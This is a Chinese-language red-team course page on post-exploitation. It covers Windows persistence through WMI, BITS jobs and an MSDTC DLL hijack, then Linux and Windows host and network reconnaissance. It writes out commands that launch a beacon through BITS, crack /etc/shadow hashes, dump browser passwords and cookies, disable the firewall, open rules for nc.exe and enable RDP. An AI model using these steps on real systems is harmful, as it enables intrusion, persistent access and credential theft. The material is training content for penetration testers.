<p>WMI是一项Windows管理技术，其全称是Windows Management Instrumentation，即Windows管理规范。大多数基于Windows的软件依赖于此服务。无文件无进程使得他非常隐蔽成为后门，但由于他的隐蔽性现在被大多数杀软所查杀。<br>通过与Powershell命令配合使用可以实现无文件，具有良好的隐蔽性也是目前较为常用的持久化手段。<br>权限要求：未降权的管理员权限。</p>
<p>由于WMI的事件会循环执行，为确保不会无限弹shell，可以使用系统启动时间来限制（只要触发延时可以落在限定区间即可，有些机器启动慢因此起始时间调高些）。示例命令如下：</p>
<hr>
<p><strong>Windows权限维持—后台智能传输服务（BITS）</strong></p>
<p>后台智能传送服务 (BITS) 可帮助传输大量数据而不会降低网络性能。它通过在小区块中传输数据、充分利用可用的但未使用的带宽和在目的地重组数据的方式来实现此操作。在 Microsoft® Windows Server 2003 家族操作系统上和 Microsoft® Windows 2000 上都支持 BITS。<br>权限要求：管理员权限（不必过UAC）。<br>•bitsadmin /list /allusers /verbose</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709134752860.png" alt="image-20220709134752860"></p>
<p>添加任务：<br>•bitsadmin /create evil<br>•bitsadmin /addfile evil “C:\Users\hunter\Desktop\beacon.exe”<br>“C:\Users\hunter\Desktop\beacon.exe”<br>•bitsadmin.exe /SetNotifyCmdLine evil<br>“C:\Users\hunter\Desktop\beacon.exe” NUL<br>•bitsadmin /Resume evil</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709134832358.png" alt="image-20220709134832358"></p>
<hr>
<p><strong>Windows权限维持—MSDTC</strong></p>
<p>msdtc.exe是微软分布式传输协调bai程序。该du进程调用系统Microsoft Personal Web Server和Microsoft SQL Server。该服务用于管理多个服务器。该服务启动后会尝试从System32加载三个DLL文件：oci.dll、SQLLib80.dll、xa80.dll。服务项如下<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709134912500.png" alt="image-20220709134912500"></p>
<p>在默认的Windows安装中，System32文件夹中缺少oci.dll这个文件，在获得写权限的情况下可以在该文件夹下写入一个同名的dll，服务启动时执行恶意代码。<br>默认情况下，由于启动类型设置为“手动”，通过以下命令设置自启：<br>•sc qc msdtc<br>•sc config msdtc start= auto<br>恶意dll会被加载到msdtc.exe进程中执行</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709134948776.png" alt="image-20220709134948776"></p>
<hr>
<p><strong>Windows权限维持—CS插件化</strong></p>
<p>•<a target="_blank" rel="noopener" href="https://github.com/0xthirteen/SharpStay">https://github.com/0xthirteen/SharpStay</a><br>•<a target="_blank" rel="noopener" href="https://github.com/lintstar/LSTAR">https://github.com/lintstar/LSTAR</a></p>
<h2 id="内-网-本-机-收-集"><a href="#内-网-本-机-收-集" class="headerlink" title="内 网 本 机 收 集"></a>内 网 本 机 收 集</h2><p><strong>内网信息收集概述</strong></p>
<p>当我们进入内网后，面对的是一片“黑暗森林”，所以要首先会对当前所处的网络环境进行判断，通常的判断分为三种。<br>•我是谁？——对机器角色的判断。<br>•这是哪？——对目前机器所处网络环境的拓扑结构进行分析和判断。<br>•我在哪？——对目前机器所处位置区域的判断。</p>
<p>•在内网渗透测试环境中，有着很多设备和报警及防护软件<br>•通过对目标内网信息的收集，洞察内网网络拓扑和结构，找出内网最薄弱的环节。<br>•信息收集的深度，直接关系到整个内网渗透测试的成败。</p>
<p>•对机器角色的判断，判断已经控制的机器是普通 Web 服务器、开发测试服务器、公共服务器、文件服务器、代理服务器、DNS 服务器还是存储服务器等。具体的判断是通过对机器内的主机名、文件、网络连接等多种情况综合进行的。<br>•对目前机器所处网络环境的拓扑结构进行分析和判断：需要对所处内网进行全面的数据收集及分析整理，绘制出大概的内网整体拓扑结构图，以便后期进行进一步的内网渗透和准确定位内网具体目标，从而完成渗透测试。<br>•对目前机器所处位置区域的判断：判断机器处于网络拓扑中的哪个区域，是在 DMZ 区、办公网，还是核心区、核心 DB 等位置。当然，这里的区域并不是绝对的，只是一个大概的环境，不同位置的网络环境不一样，区域的界限也不一定明显。</p>
<hr>
<p><strong>Linux本机信息收集–前期信息收集</strong></p>
<p>这里模拟攻击方成功拿下一台机器的低权限准备提权的情况。在运维人员能保证系统和软件维持在新版本、无弱口令、无特殊SUID文件、sudo命令的情况下，Linux提权是基本不可能的，但是安全很难做到万无一失。在各种环境中存在各种不同版本的Linux系统，甚至类UNIX系统，比如:OpenSUSE、Fedora、Oracle Linxu、Slackware、FreeBSD、OpenBSD等等<br>，所以先摸清系统版本信息是关键。</p>
<p>•hostname     # 查看服务器主机名命令<br>•uname –a<br>•uname -mrs<br>•rpm -q kernel<br>•dmesg | grep Linux<br>•ls /boot | grep vmlinuz-<br>明白了系统的版本或发行版，下一步就针对这个搜索有关的提权漏洞，<br>•<a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709135239692.png" alt="image-20220709135239692"></p>
<p>若是不存在提权漏洞的版本，那么注意点就要放到用户的信息上了。<br>•id     # 显示真实有效的用户 ID(UID)和组 ID(GID)<br>•whoami      #当前用户</p>
<p>•groups     # 当前组<br>•who     # 显示目前登录系统的用户信息</p>
<p>比如SUID文件和sudo权限，找带 suid 的文件<br>•find / -perm -u=s 2&gt;/dev/null</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709135359471.png" alt="image-20220709135359471"></p>
<p>查看当前用户执行哪些 sudo 命令无需密码<br>•sudo -l</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709135423739.png" alt="image-20220709135423739"></p>
<p>找到了可以sudo执行的文件又怎么提权呢？<br>•推荐网站:<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> #其中记录了大量的提权方案。<br>在freebsd系统中也有类似sudo的机制，称作doas<br>•cat /etc/doas.conf</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709135454258.png" alt="image-20220709135454258"></p>
<p>/etc/passwd一般不会禁止非root用户读取，可以直接查看<br>•cat /etc/passwd<br>可见存在3个test开头的用户和ldap、oracle、docker等用户，这里相当于给了很多提示，说明了一些可能存在的服务，当然这3个test开头的用户也可以尝试爆破。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709135536702.png" alt="image-20220709135536702"></p>
<p>开机启动项作为比较关键的点，无论是红方还是蓝方都不会放过。<br>•ls /etc/init.d          #查看开机启动配置文件命令</p>
<p>•cat /etc/rc.local        #查看 rc 启动文件</p>
<p>•crontab -l<br>•ls -alh /var/spool/cron<br>•ls -al /etc/ | grep cron</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709135618452.png" alt="image-20220709135618452"></p>
<hr>
<p><strong>Linux本机信息收集—后期信息收集</strong></p>
<p>到了后期阶段，当攻击者成功提权，信息收集的目的其实偏向于扩大战果，而不是寻找突破口，红方人员会详尽一且办法，挖掘机器上有用的信息，然后作为跳板横向进攻。知晓机器上运行着什么进程可以推测机器的定位:<br>•ps -aux # 列出所有进程以及相关信息命令<br>•ps -ef<br>•top     # 总览系统全面信息命令，Ctrl + C 退出界面<br>安装了哪些程序？什么版本？是否正在运行？<br>•ls -alh /usr/bin/<br>•dpkg -l</p>
<p>查看一些常见的服务配置文件<br>•cat /etc/syslog.conf<br>•cat /etc/chttp.conf<br>•cat /etc/lighttpd.conf<br>•cat /etc/cups/cupsd.conf<br>•cat /etc/inetd.conf<br>•cat /etc/apache2/apache2.conf<br>•cat /etc/my.conf<br>•cat /etc/httpd/conf/httpd.conf<br>•ls -aRl /etc/ | awk ‘$1 ~ /^.*r.*/</p>
<p>作为最高权限用户，shadow文件不可不看，万一跑出几个密码，横向渗透的成功率就会大大提高，将passwd和shaodw文件下载到kali中进行unshadow，随后john跑hash<br>•mkdir /root/.john<br>•cd /root/.john<br>•unshadow passwd.txt shadow.txt &gt; hash.txt</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709135752420.png" alt="image-20220709135752420"></p>
<p>除了shadow以外也可以看一看其他敏感文件，比如数据库的配置、历史记录等<br>•cat /var/apache2/config.inc<br>•cat /var/lib/mysql/mysql/user.MYD<br>•cat /root/anaconda-ks.cfg<br>•cat ~/.bash_history<br>•cat ~/.nano_history<br>•cat ~/.atftp_history<br>•cat ~/.mysql_history<br>•cat ~/.php_history</p>
<p>除了本机器上的信息，还要为拿下内网的其他机器做准备，摸清网络拓扑是必须的<br>•route<br>•ip route     # 显示核心路由表<br>•ip neigh     # 显示邻居表<br>•cat /etc/resolv.conf # 查看DNS<br>•arp –e<br>邮件也是一个关键点，某些场景下，可以发现非常敏感的信息。<br>•ls -alh /var/mail/<br>除此之外，具体还要查看哪些信息，就需要根据机器具体情况而定了。</p>
<hr>
<p><strong>Linux本机信息收集—Linux自动化信息收集</strong></p>
<p>linux_information是一款针对linux下信息收集的工具<br>主要模块：<br>•系统信息，能了解主机的地址、版本等信息<br>•用户信息，能了解主机的用户、分组、登陆等情况<br>•服务信息，能了解主机的端口、进程、服务、软件等信息<br>•安全扫描，能了解主机的敏感文件、能利用的漏洞等信息<br>•主机存活信息，能了解当前内网存活主机信息</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709135924617.png" alt="image-20220709135924617"></p>
<hr>
<p><strong>Windows本机信息收集常见思路</strong></p>
<p>通常我们在攻防演练过程中，遇到的Windows的环境是最多的，然⽽在拿到⼀台windows系统权限之后，我们要进⾏横向或者纵向渗透，这是针对windows的信息收集就显得尤为重要。当成功控制一台机器后，其内网结构如何、这台机器是什么角色的、使用机器的人是什么角色的、机器上安装的是什么杀毒软件、机器是通过什么方式上网的、机器是笔记本还是台式机等，都需要通过信息收集来获取。</p>
<p>•windows的本机信息包括主机的系统、权限、内网分配 IP 地址段、安装的软件杀毒、端口、服务、补丁更新频率、网络连接信息、共享、会话等。<br>•如果是域内主机，系统、软件、补丁、服务、杀毒一般都是批量安装的。通过收集本机的相关信息，可以进一步了解整个域的操作系统版本、软件、补丁、用户命名方式等。</p>
<p>•系统管理员密码<br>•其他⽤户 session ， 3389 和 ipc 连接记录 各⽤户回收站信息收集<br>•浏览器密码和浏览器cookies的获取 e chrome firefox 等<br>•windows ⽆线密码获取。数据库密码获取<br>•host ⽂件获取和 dns 缓存信息收集 等等<br>•杀软 补丁 进程 ⽹络代理信息 wpad 信息。软件列表信息<br>•计划任务 账号密码策略与锁定策略 共享⽂件夹 web服务器配置⽂件<br>•vpn 历史密码等 teamview 密码等 启动项 iislog 等等<br>•常⽤的后渗透信息收集⼯具。 powershell+msf 的使⽤</p>
<hr>
<p><strong>Windows本机信息收集–收集本机信息</strong></p>
<p>查询网络配置信息<br>执行如下命令，可以获取当前机器是否处在内网中、有几个内网、内网段分别是多少、是否是域内网、网关 IP 地址、DNS 指向的 IP 地址等信息:<br>•ipconfig /all </p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140059084.png" alt="image-20220709140059084"></p>
<p>查询操作系统及安装软件的版本信息<br>获取操作系统和版本信息：<br>•systeminfo | findstr /B /C:”OS Name” /C:”OS Version”<br>执行以上命令，可以看到当前系统为 Windows Server 2008 R2 Enterprise。如果是中文操作系统，则输入如下命令，<br>•systeminfo | findstr /B /C:”OS 名称” /C:”OS 版本”<br>(查看系统体系结构：执行如下命令，查看系统体系结构，<br>•echo %PROCESSOR_ARCHITECTURE%</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140130061.png" alt="image-20220709140130061"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140138756.png" alt="image-20220709140138756"></p>
<p>查看安装的软件及版本、路径等<br>利用 wmic 命令，可以将结果输出到文本中，具体如下，<br>•wmic product get name,version<br>利用 PowerShell 命令，收集软件版本信息，具体如下，<br>•powershell “Get-WmiObject -class Win32_Product |Select-Object -Property name,version”</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140234588.png" alt="image-20220709140234588"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140255602.png" alt="image-20220709140255602"></p>
<p>查询进程列表<br>执行如下命令，可以查看当前进程列表和进程用户，分析软件、邮件客户端、VPN 和杀毒软件等进程，<br>•tasklist /v<br>执行如下命令，查看进程信息，<br>•wmic process list brief<br>一般来说，域内的软件和杀毒软件应该是一致的。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140321071.png" alt="image-20220709140321071"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140333338.png" alt="image-20220709140333338"></p>
<p>常见的杀毒软件进程：<br>反病毒识别的相关项目:<br>•<a target="_blank" rel="noopener" href="https://github.com/gh0stkey/avList">https://github.com/gh0stkey/avList</a><br>•<a target="_blank" rel="noopener" href="https://github.com/r00tSe7en/get_AV">https://github.com/r00tSe7en/get_AV</a><br>•<a target="_blank" rel="noopener" href="https://github.com/uknowsec/SharpAVKB">https://github.com/uknowsec/SharpAVKB</a><br>•<a target="_blank" rel="noopener" href="https://github.com/3had0w/Antivirus-detection">https://github.com/3had0w/Antivirus-detection</a><br>•<a target="_blank" rel="noopener" href="https://github.com/ars3n11/Aggressor-Scripts">https://github.com/ars3n11/Aggressor-Scripts</a><br><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140407835.png" alt="image-20220709140407835"></p>
<p>查看启动程序信息<br>执行如下命令，查看启动程序信息:<br>•wmic startup get command,caption</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140429763.png" alt="image-20220709140429763"></p>
<p>查看计划任务<br>执行如下命令，查看计划任务:<br>•schtasks /query /fo LIST /v</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140505103.png" alt="image-20220709140505103"></p>
<p>查看主机开机时间<br>执行如下命令，查看主机开机时间：<br>•net statistics workstation</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140535744.png" alt="image-20220709140535744"></p>
<p>查询用户列表<br>执行如下命令，查看本机用户列表。<br>•net user<br>通过分析本机用户列表，可以找出内部网络机器名的命名规则。特别是个人机器，可以推测出整个域的用户命名方式，<br>执行如下命令，获取本地管理员（通常含有域用户）信息。<br>•net localgroup administrators<br>可以看到，本地管理员有两个用户和一个组，如图 所示。默认 Domain Admins 组为域内机器的本地管理员用户。在真实环境中，为了方便管理，会有域用户被添加为域机器的本地管理员用户。<br>执行如下命令，查看当前在线用户，<br>•query user || qwinsta</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140608049.png" alt="image-20220709140608049"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140617111.png" alt="image-20220709140617111"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140630051.png" alt="image-20220709140630051"></p>
<p>列出或断开本地计算机和连接的客户端的会话<br>执行如下命令，列出或断开本地计算机和连接的客户端的会话:<br>•net session</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140700788.png" alt="image-20220709140700788"></p>
<p>查询端口列表<br>执行如下命令，查看端口列表、本机开放的端口所对应的服务和应用程序。<br>•netstat –ano<br>可以看到，当前机器和哪些主机进行了连接，以及 TCP、UDP 等端口使用、监听情况。还可以通过网络连接来进行初步的判断，如代理服务器可能会有很多机器来连代理端口、更新服务器（例如 WSUS）可能开放了更新端口8530、DNS 服务器会开放 53 端口等，再根据其他信息进行综合判断。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140735861.png" alt="image-20220709140735861"></p>
<p>查询补丁列表<br>执行如下命令，查看系统的详细信息。<br>•Systeminfo<br>注意系统的版本、位数、域、补丁信息及跟新频率等。一般域内主机的补丁都是批量安装的，通过查看本地计算机补丁列表，可以找到未打补丁的漏洞。当前更新了162 个补丁:</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140759220.png" alt="image-20220709140759220"></p>
<p>使用 wmic 识别安装在系统中的补丁情况，命令如下：<br>•wmic qfe get Caption,Description,HotFixID,InstalledOn<br>可以看到更新补丁名称、描述、补丁 ID、安装时间等信息:</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140819921.png" alt="image-20220709140819921"></p>
<p>查询本机共享<br>执行如下命令，查看本机共享列表和可访问的域共享列表（域内共享有很多时候是相同的），<br>•net share<br>利用 wmic 查找共享，命令如下：<br>•wmic share get name,path,status</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140851873.png" alt="image-20220709140851873"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140902081.png" alt="image-20220709140902081"></p>
<p>查询路由表及所有可用接口的 ARP 缓存表<br>执行如下命令，查询路由表及所有可用接口的 ARP（地址解析协议）缓存表:<br>•route print<br>•Arp –A</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140923822.png" alt="image-20220709140923822"></p>
<p>查询防火墙相关配置<br>（1）关闭防火墙<br>Windows Server 2003 系统及之前版本，命令如下。<br>•netsh firewall set opmode disable<br>Windows Server 2003 之后系统版本，命令如下。<br>•netsh advfirewall set allprofiles state off<br>（2）查看防火墙配置<br>•netsh firewall show config</p>
<p>修改防火墙配置<br>Windows Server 2003 系统及之前版本，允许指定程序全部连接，命令如下。<br>•netsh firewall add allowedprogram c:\nc.exe “allow nc” enable<br>Windows Server 2003 之后系统版本，情况如下。<br>允许指定程序连入，命令如下:<br>•netsh advfirewall firewall add rule name=”pass nc” dir=in action=allow<br>program=”C: \nc.exe”<br>允许指定程序连出，命令如下：<br>•netsh advfirewall firewall add rule name=”Allow nc” dir=out action=allow<br>program=”C: \nc.exe”<br>允许 3389 端口放行，命令如下：<br>•netsh advfirewall firewall add rule name=”Remote Desktop” protocol=TCP dir=in<br>localport=3389 action=allow</p>
<p>查看计算机代理配置情况<br>执行如下命令，可以看到代理配置存在服务器为 127.0.0.1:1080 的配置信息，如图所示。<br>•reg query “HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings”</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709141053571.png" alt="image-20220709141053571"></p>
<p>查询并开启远程连接服务<br>查看远程连接端口，在 cmd 下使用注册表查询语句，命令如下，得到连接端口为 0xd3d，转换后为3389:<br>•REG QUERY “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp” /V PortNumber</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709141118963.png" alt="image-20220709141118963"></p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">在 Windows <span class="keyword">Server</span> <span class="number">2003</span> 中开启 <span class="number">3389</span> 端口</span><br><span class="line">•wmic <span class="type">path</span> win32_terminalservicesetting <span class="keyword">where</span> (__CLASS !=&quot;&quot;) <span class="keyword">call</span> </span><br><span class="line">setallowtsconnections <span class="number">1</span></span><br><span class="line">在 Windows <span class="keyword">Server</span> <span class="number">2008</span> 和 Windows <span class="keyword">Server</span> <span class="number">2012</span> 中开启 <span class="number">3389</span> 端口</span><br><span class="line">•wmic /namespace:\\root\cimv2\terminalservices <span class="type">path</span> </span><br><span class="line">win32_terminalservicesetting <span class="keyword">where</span> (__CLASS !=&quot;&quot;) <span class="keyword">call</span> setallowtsconnections <span class="number">1</span></span><br><span class="line">•wmic /namespace:\\root\cimv2\terminalservices <span class="type">path</span> win32_tsgeneralsetting </span><br><span class="line"><span class="keyword">where</span> (TerminalName=<span class="string">&#x27;RDP-Tcp&#x27;</span>) <span class="keyword">call</span> setuserauthenticationrequired <span class="number">1</span></span><br><span class="line">•reg <span class="keyword">add</span> &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v </span><br><span class="line">fSingleSessionPerUser /t REG_DWORD /d <span class="number">0</span> /f</span><br></pre></td></tr></table></figure>

<p>查看当前权限<br>查看当前权限，命令如下。<br>•whoami<br>获取了一台主机的权限后，会有以下三种情况。<br>•本地普通用户<br>•本地管理员用户<br>•域内用户</p>
<p>在这三种情况中，如果当前内网存在域，本地普通用户只能查询本机相关信息，不能查询域内信息。本地管理员用户和域内用户则可以查询域内信息。其原理是：域内的所有查询都是通过域 LDAP 协议去域控制器进行查询的，而这个查询需要经过权限认证，所以，只有域用户才拥有这个权限；当域用户运行查询命令时，会自动使用 Kerberos 协议进行认证，无须额外输入账号和密码。本地管理员 administrator 权限可以直接提升为 nt authority\system 权限，因此，在域中，除了普通用户，所有机器都有一个机器用户，用户名是机器名后加“$”。在本质上，机器上的system用户对应的就是域里面的机器用户，所以，system 权限是可以运行域内查询的相关命令的。</p>
<p>获取域 SID<br>执行如下命令，获取域 SID。<br>•whoami /all<br>可看到，当前域 pentest 的 SID 为 S-1-5-21-3112629480-1751665795-4053538595，域用户 user1的 SID 为 S-1-5-21-3112629480-1751665795-4053538595-1104，</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709141626748.png" alt="image-20220709141626748"></p>
<p>查询指定账户的详细信息<br>执行如下命令，查询指定账户的详细信息。<br>•net user XXX /domain<br>在 cmd 下输入命令“net user user /domain”，可以看到，当前用户在本地组没有本地管理员权限，在域中属于 Domain Users 组:</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709141649167.png" alt="image-20220709141649167"></p>
<p>电脑上的敏感文件</p>
<p>DPAPI<br>从Windows 2000开始，Microsoft随操作系统一起提供了一种特殊的数据保护接口，称为Data Protection Application Programming Interface（DPAPI）。其分别提供了加密函数CryptProtectData 与解密函数 CryptUnprotectData 以用作敏感信息的加密解密。Dpapi采用的加密类型为对称加密，所以只要找到了密钥，就能解开物理存储的加密信息。<br>其作用范围包括且不限于：<br>•outlook客户端密码<br>•windowscredential凭据<br>•chrome保存的密码凭据<br>•internetexplorer密码凭据</p>
<p>浏览器密码获取<br>•<a target="_blank" rel="noopener" href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a><br>•<a target="_blank" rel="noopener" href="https://github.com/djhohnstein/SharpWeb">https://github.com/djhohnstein/SharpWeb</a><br>•<a target="_blank" rel="noopener" href="https://github.com/QAX-A-Team/BrowserGhost/">https://github.com/QAX-A-Team/BrowserGhost/</a><br>•<a target="_blank" rel="noopener" href="https://github.com/DeEpinGh0st/Browser-cookie-steal">https://github.com/DeEpinGh0st/Browser-cookie-steal</a><br>•<a target="_blank" rel="noopener" href="https://github.com/hayasec/360SafeBrowsergetpass">https://github.com/hayasec/360SafeBrowsergetpass</a></p>
<p>hack-browser-data<br>hack-browser-data 是⼀个解密浏览器数据（密码|历史记录| Cookie |书签 | 信⽤卡 | 下载记录）的导出⼯<br>具，⽀持全平台主流浏览器。<br>•项⽬地址：<a target="_blank" rel="noopener" href="https://github.com/moonD4rk/HackBrowserData/">https://github.com/moonD4rk/HackBrowserData/</a><br>•.\hack-browser-data.exe -b all -f json –dir results –cc</p>
<p>第三方软件</p>
<hr>
<p><strong>Windows本机信息收集—自动化信息收集</strong></p>
<p>Msf常用相关模块<br>•获取⽬标机器的分区信息： post/windows/gather/forensics/enum_drives<br>•判断是否是虚拟机： post/windows/gather/checkvm<br>•开启了什么服务： post/windows/gather/enum_services<br>•安装了什么应⽤： post/windows/gather/enum_applications<br>•查看共享: post/windows/gather/enum_shares<br>•获取主机最近的系统操作： post/windows/gather/dumplinks<br>•查看补丁： run post/windows/gather/enum_patches</p>
<p>Seatbelt<br>•<a target="_blank" rel="noopener" href="https://github.com/GhostPack/Seatbelt">https://github.com/GhostPack/Seatbelt</a><br>Seatbelt.exe<br>•Seatbelt.exe -group=user -full 运行普通用户权限检查的模块 -full返回输出<br>•Seatbelt.exe -group=all 运行所有模块（需要管理员权限）<br>•Seatbelt.exe -group=system #运行检查系统相关的信息<br>•Seatbelt.exe -group=misc #运行所有其他检查（包括浏览器记录）<br>•Seatbelt.exe -group=chrome 运行浏览器历史等模块</p>
<h2 id="内-网-横-向-收-集"><a href="#内-网-横-向-收-集" class="headerlink" title="内 网 横 向 收 集"></a>内 网 横 向 收 集</h2><p>在攻陷⼀台机器后，不要⼀味的直接去抓取机器密码、去做⼀些扫描内⽹的操作，因为如果⽹内有IDS等安全设备，有可能会造成报警，丢失权限。一般来说扫描的优先级是比较低的。<br>•主机存活探测<br>•存活探测<br>•端口扫描<br>•各类服务爆破<br>•指纹识别<br>•漏洞扫描<br>•….<br>关键点:<br>•选好时间点进行扫描<br>•有选择性的选择功能点进行扫描，不用马上进行全功能扫描<br>•流量免杀与规避<br>•注意团队协助，共用一个平台，防止重复扫描。</p>
<hr>
<p><strong>内网横向信息收集—网段信息收集</strong></p>
<p>网段信息收集<br>只有找到不同网段才能进行纵向渗透，否则只能横向渗透<br>•端口扫描：用s.exe工具进行扫描，例如渗透到192.168.1.10网段，可能存在192.168.2.0/3.0网段等。只扫描网段的一个端口以探测是否存在该网段。如果有端口信息回显表示该网段存在，可以进行深入探测。常见端口：windows:445/linux:22<br>•抓包分析网络流量，看网段信息。也可以使用meterpreter做转发抓取目标所在网络流量<br>•渗透路由器、核心交换机<br>•文件共享/FTP连接记录、浏览器访问记录、mstsc连接记录、ssh连接记录。</p>
<hr>
<p><strong>内网横向信息收集—多网卡机器探测</strong></p>
<p>当我们进入内网后想要扩大战果，那我们可能首先想知道当前主机能通哪些内网段<br>•<a target="_blank" rel="noopener" href="https://github.com/shmilylty/netspy">https://github.com/shmilylty/netspy</a><br>用于寻找多网卡主机方便内网跨网段渗透避免瞎打找不到核心网<br>•<a target="_blank" rel="noopener" href="https://github.com/r35tart/GetIPinfo">https://github.com/r35tart/GetIPinfo</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709142112812.png" alt="image-20220709142112812"></p>
<hr>
<p><strong>内网横向信息收集—主机存活探测</strong></p>
<p>可以使用如下命令来达到内网主机的发现。<br>查看共享资料：<br>•net view<br>查看arp表：<br>•arp -a<br>查看hosts文件：<br>•linux:cat /etc/hosts<br>•windows:type c:\Windows\system32\drivers\etc\hosts<br>查看dns缓存：<br>•ipconfig /displaydns</p>
<p>UDP协议探测<br>UDP（User Datagram Protocol）是一种无连接的协议，在第四层-传输层，处于IP协议的上一层。UDP有不提供数据包分组、组装和不能对数据包进行排序的缺点，也就是说，当报文发送之后，是无法得知其是否安全完整到达的。<br>UDP显著特性<br>•UDP 缺乏可靠性。UDP 本身不提供确认，超时重传等机制。UDP 数据报可能在网络中被复制，被重新排序，也不保证每个数据报只到达一次。<br>•.UDP 数据报是有长度的。每个 UDP 数据报都有长度，如果一个数据报正确地到达目的地，那么该数据报的长度将随数据一起传递给接收方。而 TCP 是一个字节流协议，没有任何（协议上的）记录边界。<br>•UDP 是无连接的。UDP 客户和服务器之前不必存在长期的关系。大多数的UDP实现中都选择忽略源站抑制差错，在网络拥塞时，目的端无法接收到大量的UDP数据报</p>
<p>msf扫描<br>•msf &gt; use auxiliary/scanner/discovery/udp_probe<br>•msf &gt; use auxiliary/scanner/discovery/udp_sweep</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709142239614.png" alt="image-20220709142239614"></p>
<p>nmap扫描<br>•nmap -sU -T5 -sV –max-retries 1 192.168.1.100 -p 500 （不推荐，理由慢）</p>
<p>ARP协议探测<br>ARP,通过解析网路层地址来找寻数据链路层地址的一个在网络协议包中极其重要的网络传输协议。根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址。<br>msf扫描<br>•use auxiliary/scanner/discovery/arp_sweep</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709142332533.png" alt="image-20220709142332533"></p>
<p>基于netbios 的扫描<br>IBM公司开发，主要用于数十台计算机的小型局域网。该协议是一种在局域网上的程序可以使用的应用程序编程接口（API），为程序提供了请求低级服务的同一的命令集，作用是为了给局域网提供网络以及其他特殊功能。系统可以利用WINS服务、广播及Lmhost文件等多种模式将NetBIOS名-——特指基于NETBIOS协议获得计算机名称——解析为相应IP地址，实现信息通讯，所以在局域网内部使用NetBIOS协议可以方便地实现消息通信及资源的共享。<br>msf扫描<br>•msf &gt; use auxiliary/scanner/netbios/nbname<br>nbtscan扫描<br>•项目地址：<a target="_blank" rel="noopener" href="http://www.unixwiz.net/tools/nbtscan.html">http://www.unixwiz.net/tools/nbtscan.html</a><br>•Windows:nbtscan-1.0.35.exe -m 192.168.1.0/24<br>•Linux：nbtscan -r 192.168.1.0/24</p>
